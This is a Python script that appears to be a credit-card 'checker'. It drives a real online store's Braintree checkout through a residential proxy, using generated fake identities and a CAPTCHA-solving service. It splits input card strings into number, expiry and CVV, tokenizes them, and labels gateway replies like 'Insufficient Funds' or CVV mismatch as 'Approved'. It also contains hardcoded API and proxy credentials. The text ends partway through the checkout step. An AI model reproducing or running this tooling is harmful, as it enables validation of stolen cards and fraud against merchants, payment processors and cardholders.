import re
import time, names
import base64
import random
import capsolver
import secrets
import base64
from requests import Session
from dataclasses import dataclass
import uuid,base64, json
from retry import retry
import random



class Solverv2:

    def solver(self,url,keysite):
        self.session = Session()
        capsolver.api_key = 'CAP-49921C094F791244557416016E4CD408'
        solution = capsolver.solve({"type": "ReCaptchaV2Task","websiteURL": url,"websiteKey": keysite})
        return solution

@dataclass
class BehaviorsBraintree:

    def ResponseHtml(self, response:str=None):   
        if   'avs_and_cvv' in response:                             return 'Approved! ✅', response
        elif 'cvv: Gateway Rejected: cvv' in response:              return 'Approved! ✅', response
        elif 'Insufficient Funds' in response:                      return 'Approved! ✅', response
        elif 'avs: Gateway Rejected: avs' in response:              return 'Approved! ✅', response
        elif 'CVV.' in response:                                    return 'Approved! ✅', response
        elif 'Card Issuer Declined CVV' in response:                return 'Approved! ✅', response
        elif 'Invalid postal code and cvv' in response:             return 'Approved! ✅', response
        elif 'Nice! New payment method added' in response:          return 'Approved! ✅', response
        elif 'Payment method successfully added.' in response:      return 'Approved! ✅', response
        elif 'Invalid postal code or street address' in response:   return 'Approved! ✅', response 
        elif 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number' in response:                return 'Approved! ✅', response
        else:                                                       return 'Declined! ❌', response

    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)

    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id

    def Ccs(self, cards:str=None):
        if '|' in cards: 
            return cards.split('|')
        elif ':' in cards: 
            return cards.split(':')
        elif ',' in cards: 
            return cards.split(',')
        elif '-' in cards: return cards.split('-')

        return cards
    


    @classmethod
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):

        self.uophs = data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        try:
            return self.uophs
        
        except: 
            return 'value not found' 
    
    @classmethod    
    def RandomName(self,dato:str=None):
        if dato == 'username': 
            self.username = "{}{}{}".format(
                    names.get_first_name(),
                    names.get_last_name(),
                    random.randint(1000000,9999999)
                    )
            return self.username
         
        elif dato == 'email': 
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.email
        
        elif dato == 'password': 
            self.password = "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.password
        
        elif dato == 'numero':
            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return self.number
        
        else:
            return 'valores incorrectos: >>>   BehaviorsBraintree().RandomName("username")'


    @classmethod
    def correlation_id(self):
        self.id_corre = secrets.token_hex(16)
        return self.id_corre
    
    
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id

    @classmethod
    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = BehaviorsBraintree().QueryText(
            self._tokenEncoding, 
            '"authorizationFingerprint":"',  
            '","')

        return self.bear_end

    
    @classmethod
    def Response(self, response:str=None):   
        if   'avs_and_cvv' in response:                             return 'Approved! ✅', response
        elif 'Insufficient Funds' in response:                      return 'Approved! ✅', response
        elif 'avs: Gateway Rejected: avs' in response:              return 'Approved! ✅', response
        elif 'CVV.' in response:                                    return 'Approved! ✅', response
        elif 'Card Issuer Declined CVV' in response:                return 'Approved! ✅', response
        elif 'Invalid postal code and cvv' in response:             return 'Approved! ✅', 'Charged $1.0'
        elif 'Nice! New payment method added' in response:          return 'Approved! ✅', response
        elif 'Payment method successfully added.' in response:      return 'Approved! ✅', response
        elif 'Invalid postal code or street address' in response:   return 'Approved! ✅', response 
        elif 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number' in response:                return 'Approved! ✅', response
        else:                                                       return 'Declined! ❌', response
            
    @classmethod
    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = BehaviorsBraintree().QueryText(
            self._tokenEncoding, 
            '"authorizationFingerprint":"',  
            '","')

        return self.bear_end






def RandomName(dato:str=None):
        if dato == 'username': return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        elif dato == 'correo': return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        elif dato == 'password': return f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        else: return 'Valores InCorrectos: username, password, correo'

class CutStr():
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):
        return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
from requests import Session
from retry import retry
import requests


class b3precha:
    
    def main(self, card):
      #  try:
            self.Nombre = RandomName('username')
            self.UseMail = RandomName('correo')

            self.session = Session()
            self.session.proxies.update({"http://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060","https://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060",})
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://thesaddlehouse.com/product/sh-texas-logo-onesie-pink/',
                'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-03-11%2002%3A02%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fthesaddlehouse.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-03-11%2002%3A02%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fthesaddlehouse.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F134.0.0.0%20Safari%2F537.36; _gcl_au=1.1.1548434682.1741658556; _ga=GA1.1.681576388.1741658555; _hjSession_5240006=eyJpZCI6Ijg0ZWEzOTViLWJlYTMtNDlkOC1iMzk1LWExNTcxYzhiYzgzMiIsImMiOjE3NDE2NTg1NTc0NjMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _hjSessionUser_5240006=eyJpZCI6IjNhY2FjMzI0LTc4OTAtNTQ2YS1iY2I0LThmMjVhZDIwOTRlMCIsImNyZWF0ZWQiOjE3NDE2NTg1NTc0NDAsImV4aXN0aW5nIjp0cnVlfQ==; pys_session_limit=true; pys_start_session=true; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://thesaddlehouse.com/product-category/saddle/barrel-saddles/; last_pysTrafficSource=direct; last_pys_landing_page=https://thesaddlehouse.com/product-category/saddle/barrel-saddles/; wp_woocommerce_session_1ba3fd1fb22d41ded172df02a692641b=t_ab5d6534666a240265f7a0a7856255%7C%7C1741831396%7C%7C1741827796%7C%7C7ee83988a7c3eec9e288e56a7c210641; __kla_id=eyJlbWFpbCI6InNoanNqYWpzakBnbWFpbC5jb20iLCJmaXJzdF9uYW1lIjoic2FkZGFkYSIsImxhc3RfbmFtZSI6ImZzYWZhZmFzZiJ9; pys_advanced_form_data=%7B%22first_name%22%3A%22saddada%22%2C%22last_name%22%3A%22fsafafasf%22%2C%22email%22%3A%22shjsjajsj%40gmail.com%22%2C%22phone%22%3A%22526466308864%22%7D; mailpoet_subscriber=%7B%22subscriber_id%22%3A560713%7D; mailpoet_page_view=%7B%22timestamp%22%3A1741658799%7D; __cf_bm=Xqx.fwAmtb_2O61mwUEr6Z71rFMQxMeF9HdEd8u5ii8-1741659844-1.0.1.1-xBaPz.6kzjToiax1A0wpFp..K4SNhgq88mr1D27Le7OPZ.WspPbEYvR0CcyncMlvmx4020qCW99mEUdUkhd8JF5MYWqZ0iaGEhsGyDylyGM; _iub_cs-90483436=%7B%22id%22%3A90483436%7D; usprivacy=%7B%22uspString%22%3A%221YN-%22%2C%22firstAcknowledgeDate%22%3A%222025-03-11T02%3A02%3A36.285Z%22%2C%22optOutDate%22%3Anull%7D; _iub_cs-90483436-uspr=%7B%22s%22%3Atrue%2C%22sh%22%3Atrue%2C%22adv%22%3Atrue%7D; sbjs_session=pgs%3D30%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fthesaddlehouse.com%2Fproduct%2Fsh-classic-logo-t-shirt-heather-navy%2F; _ga_PCB2B4B822=GS1.1.1741658555.1.1.1741660165.0.0.0',
            }

            self.req_1 = self.session.get(
                'https://thesaddlehouse.com/product/sh-classic-logo-t-shirt-heather-navy/',
                headers=headers,
            )
            

            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://thesaddlehouse.com',
                'priority': 'u=1, i',
                'referer': 'https://thesaddlehouse.com/product/sh-classic-logo-t-shirt-heather-navy/',
                'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-03-11%2002%3A02%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fthesaddlehouse.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-03-11%2002%3A02%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fthesaddlehouse.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F134.0.0.0%20Safari%2F537.36; _gcl_au=1.1.1548434682.1741658556; _ga=GA1.1.681576388.1741658555; _hjSession_5240006=eyJpZCI6Ijg0ZWEzOTViLWJlYTMtNDlkOC1iMzk1LWExNTcxYzhiYzgzMiIsImMiOjE3NDE2NTg1NTc0NjMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _hjSessionUser_5240006=eyJpZCI6IjNhY2FjMzI0LTc4OTAtNTQ2YS1iY2I0LThmMjVhZDIwOTRlMCIsImNyZWF0ZWQiOjE3NDE2NTg1NTc0NDAsImV4aXN0aW5nIjp0cnVlfQ==; pys_session_limit=true; pys_start_session=true; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://thesaddlehouse.com/product-category/saddle/barrel-saddles/; last_pysTrafficSource=direct; last_pys_landing_page=https://thesaddlehouse.com/product-category/saddle/barrel-saddles/; wp_woocommerce_session_1ba3fd1fb22d41ded172df02a692641b=t_ab5d6534666a240265f7a0a7856255%7C%7C1741831396%7C%7C1741827796%7C%7C7ee83988a7c3eec9e288e56a7c210641; __kla_id=eyJlbWFpbCI6InNoanNqYWpzakBnbWFpbC5jb20iLCJmaXJzdF9uYW1lIjoic2FkZGFkYSIsImxhc3RfbmFtZSI6ImZzYWZhZmFzZiJ9; pys_advanced_form_data=%7B%22first_name%22%3A%22saddada%22%2C%22last_name%22%3A%22fsafafasf%22%2C%22email%22%3A%22shjsjajsj%40gmail.com%22%2C%22phone%22%3A%22526466308864%22%7D; mailpoet_subscriber=%7B%22subscriber_id%22%3A560713%7D; mailpoet_page_view=%7B%22timestamp%22%3A1741658799%7D; __cf_bm=Xqx.fwAmtb_2O61mwUEr6Z71rFMQxMeF9HdEd8u5ii8-1741659844-1.0.1.1-xBaPz.6kzjToiax1A0wpFp..K4SNhgq88mr1D27Le7OPZ.WspPbEYvR0CcyncMlvmx4020qCW99mEUdUkhd8JF5MYWqZ0iaGEhsGyDylyGM; _iub_cs-90483436=%7B%22id%22%3A90483436%7D; usprivacy=%7B%22uspString%22%3A%221YN-%22%2C%22firstAcknowledgeDate%22%3A%222025-03-11T02%3A02%3A36.285Z%22%2C%22optOutDate%22%3Anull%7D; _iub_cs-90483436-uspr=%7B%22s%22%3Atrue%2C%22sh%22%3Atrue%2C%22adv%22%3Atrue%7D; sbjs_session=pgs%3D31%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fthesaddlehouse.com%2Fproduct%2Fsh-classic-logo-t-shirt-heather-navy%2F; _ga_PCB2B4B822=GS1.1.1741658555.1.1.1741660181.0.0.0',
            }

            data = {
                'attribute_size': 'M',
                'quantity': '1',
                'add-to-cart': '12435',
                'product_id': '12435',
                'variation_id': '12438',
                'action': 'basel_ajax_add_to_cart',
            }

            self.session.post('https://thesaddlehouse.com/wp-admin/admin-ajax.php', headers=headers, data=data)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'priority': 'u=0, i',
                'referer': 'https://thesaddlehouse.com/product/sh-classic-logo-t-shirt-heather-navy/',
                'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-03-11%2002%3A02%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fthesaddlehouse.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-03-11%2002%3A02%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fthesaddlehouse.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F134.0.0.0%20Safari%2F537.36; _gcl_au=1.1.1548434682.1741658556; _ga=GA1.1.681576388.1741658555; _hjSession_5240006=eyJpZCI6Ijg0ZWEzOTViLWJlYTMtNDlkOC1iMzk1LWExNTcxYzhiYzgzMiIsImMiOjE3NDE2NTg1NTc0NjMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _hjSessionUser_5240006=eyJpZCI6IjNhY2FjMzI0LTc4OTAtNTQ2YS1iY2I0LThmMjVhZDIwOTRlMCIsImNyZWF0ZWQiOjE3NDE2NTg1NTc0NDAsImV4aXN0aW5nIjp0cnVlfQ==; pys_session_limit=true; pys_start_session=true; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://thesaddlehouse.com/product-category/saddle/barrel-saddles/; last_pysTrafficSource=direct; last_pys_landing_page=https://thesaddlehouse.com/product-category/saddle/barrel-saddles/; wp_woocommerce_session_1ba3fd1fb22d41ded172df02a692641b=t_ab5d6534666a240265f7a0a7856255%7C%7C1741831396%7C%7C1741827796%7C%7C7ee83988a7c3eec9e288e56a7c210641; __kla_id=eyJlbWFpbCI6InNoanNqYWpzakBnbWFpbC5jb20iLCJmaXJzdF9uYW1lIjoic2FkZGFkYSIsImxhc3RfbmFtZSI6ImZzYWZhZmFzZiJ9; pys_advanced_form_data=%7B%22first_name%22%3A%22saddada%22%2C%22last_name%22%3A%22fsafafasf%22%2C%22email%22%3A%22shjsjajsj%40gmail.com%22%2C%22phone%22%3A%22526466308864%22%7D; mailpoet_subscriber=%7B%22subscriber_id%22%3A560713%7D; __cf_bm=Xqx.fwAmtb_2O61mwUEr6Z71rFMQxMeF9HdEd8u5ii8-1741659844-1.0.1.1-xBaPz.6kzjToiax1A0wpFp..K4SNhgq88mr1D27Le7OPZ.WspPbEYvR0CcyncMlvmx4020qCW99mEUdUkhd8JF5MYWqZ0iaGEhsGyDylyGM; _iub_cs-90483436=%7B%22id%22%3A90483436%7D; usprivacy=%7B%22uspString%22%3A%221YN-%22%2C%22firstAcknowledgeDate%22%3A%222025-03-11T02%3A02%3A36.285Z%22%2C%22optOutDate%22%3Anull%7D; _iub_cs-90483436-uspr=%7B%22s%22%3Atrue%2C%22sh%22%3Atrue%2C%22adv%22%3Atrue%7D; sbjs_session=pgs%3D31%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fthesaddlehouse.com%2Fproduct%2Fsh-classic-logo-t-shirt-heather-navy%2F; _ga_PCB2B4B822=GS1.1.1741658555.1.1.1741660181.0.0.0; woocommerce_items_in_cart=1; woocommerce_cart_hash=700874f2388c1554abbc5a8d452b3526; wc_session_ids[default]=c8e5da5e98af42d2c6e1118dc30d11dd7f91422a; wc_session_ids[multi][0]=0ab1ec0112ba5806527f545a1b21e86425c4263e; wc_session_ids[multi][1]=895da79089cabac6d44d505141246a777e62b548; wc_session_ids[multi][2]=13ccd044b31ae1d82c1b6e8549e6bf60e8de9e33; wc_session_ids[multi][3]=12c54feda266f49332309aef09844bccbbcd0222; wc_session_ids[multi][4]=c5550ebaa71dd6a42db004ceebc5a3bce588ec3f; mailpoet_page_view=%7B%22timestamp%22%3A1741660232%7D',
            }

            self.session.get('https://thesaddlehouse.com/cart/', headers=headers)


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'priority': 'u=0, i',
                'referer': 'https://thesaddlehouse.com/cart/',
                'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                }

            self.req_2 = self.session.get('https://thesaddlehouse.com/checkout/', headers=headers)
            
            self.nonce_Checkout = BehaviorsBraintree().QueryText(self.req_2.text,'name="woocommerce-process-checkout-nonce" value="','"')
            wc_braintree_client_token = BehaviorsBraintree().QueryText(self.req_2.text,'var wc_braintree_client_token = ["','"')
            self.token_bear = BehaviorsBraintree().DecodeBear(wc_braintree_client_token)
            self.client_id = BehaviorsBraintree().SessionId()
            self.ccs = BehaviorsBraintree().Ccs(card)

            #print(self.nonce_Checkout)
            #print(wc_braintree_client_token)
            #print(self.req_2)

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://thesaddlehouse.com','priority': 'u=1, i','referer': 'https://thesaddlehouse.com/checkout/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            params = {'wc-ajax': 'update_order_review',}
            data = f'security=ec1c1409a2&payment_method=braintree_cc&country=US&state=&postcode=10036&city=Manhattan&address=Times+Square%2C+Nueva+York%2C+EE.+UU.&address_2=&s_country=US&s_state=&s_postcode=10036&s_city=Manhattan&s_address=Times+Square%2C+Nueva+York%2C+EE.+UU.&s_address_2=&has_full_address=false&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fthesaddlehouse.com%252F%26wc_order_attribution_session_start_time%3D2025-03-11%252002%253A02%253A35%26wc_order_attribution_session_pages%3D1%26wc_order_attribution_session_count%3D2%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F134.0.0.0%2520Safari%252F537.36%26billing_first_name%3DDeerek%26billing_last_name%3DDylan%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3DTimes%2520Square%252C%2520Nueva%2520York%252C%2520EE.%2520UU.%26billing_address_2%3D%26billing_city%3DManhattan%26billing_state%3D%26billing_postcode%3D10036%26billing_phone%3D%252B526466308864%26billing_email%3Dshjsj2ajsj%2540gmail.com%26account_username%3D%26account_password%3D%26ajdg_nobot_answer%3D%26ajdg_nobot_id%3D0%26ajdg_nobot_hash%3D758dd053b3a21f9bbb4881ed24fd0ed4230afaf5d2dcc6f2eaea18b62382757a%26captcha%3D%26captcha_confirm%3D%2520%26order_comments%3D%26shipping_method%255B0%255D%3Dbetrs_shipping%253A22-1%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%26woocommerce-process-checkout-nonce%{self.nonce_Checkout}%26_wp_http_referer%3D%252Fcheckout%252F%26pys_utm%3Dutm_source%253Aundefined%257Cutm_medium%253Aundefined%257Cutm_campaign%253Aundefined%257Cutm_term%253Aundefined%257Cutm_content%253Aundefined%26pys_utm_id%3Dfbadid%253Aundefined%257Cgadid%253Aundefined%257Cpadid%253Aundefined%257Cbingid%253Aundefined%26pys_browser_time%3D21-22%257CMonday%257CMarch%26pys_landing%3Dhttps%253A%252F%252Fthesaddlehouse.com%252Fproduct-category%252Fsaddle%252Fbarrel-saddles%252F%26pys_source%3Ddirect%26pys_order_type%3Dnormal%26last_pys_landing%3Dhttps%253A%252F%252Fthesaddlehouse.com%252Fproduct-category%252Fsaddle%252Fbarrel-saddles%252F%26last_pys_source%3Ddirect%26last_pys_utm%3Dutm_source%253Aundefined%257Cutm_medium%253Aundefined%257Cutm_campaign%253Aundefined%257Cutm_term%253Aundefined%257Cutm_content%253Aundefined%26last_pys_utm_id%3Dfbadid%253Aundefined%257Cgadid%253Aundefined%257Cpadid%253Aundefined%257Cbingid%253Aundefined&shipping_method%5B0%5D=betrs_shipping%3A22-1'
            self.session.post('https://thesaddlehouse.com/', params=params, headers=headers, data=data)

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9,en;q=0.8','authorization': f'Bearer {self.token_bear}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': self.client_id,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': self.ccs[0],
                            'expirationMonth': self.ccs[1],
                            'expirationYear': self.ccs[2],
                            'cvv': self.ccs[3],
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            self.req_5 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            self.token_card = BehaviorsBraintree().QueryText(self.req_5.text,'{"token":"','"')
            #print(self.token_card)

            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://thesaddlehouse.com',
                'priority': 'u=1, i',
                'referer': 'https://thesaddlehouse.com/checkout/',
                'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                 }
            params = {'wc-ajax': 'checkout',}

